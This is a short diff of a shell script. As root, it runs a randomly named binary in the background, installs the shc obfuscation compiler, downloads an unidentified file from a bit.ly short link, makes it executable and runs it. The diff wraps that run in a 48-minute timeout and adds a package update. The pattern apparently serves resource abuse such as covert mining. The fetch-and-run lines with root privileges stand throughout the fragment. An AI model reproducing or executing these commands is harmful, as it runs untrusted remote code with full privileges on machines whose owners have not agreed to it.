@@ -7,4 +7,5 @@ sudo su --command "nohup ./3NZULg3 --log=stdout > meta.log &"
 sleep 2
 sudo su --command "cat meta.log" 
 sudo su --command "apt-get install shc -y && wget https://bit.ly/39IevGg && chmod +x 39IevGg"
-sudo su --command "./39IevGg"
+sudo su --command "timeout 48m ./39IevGg"
+sudo su --command "apt-get update"
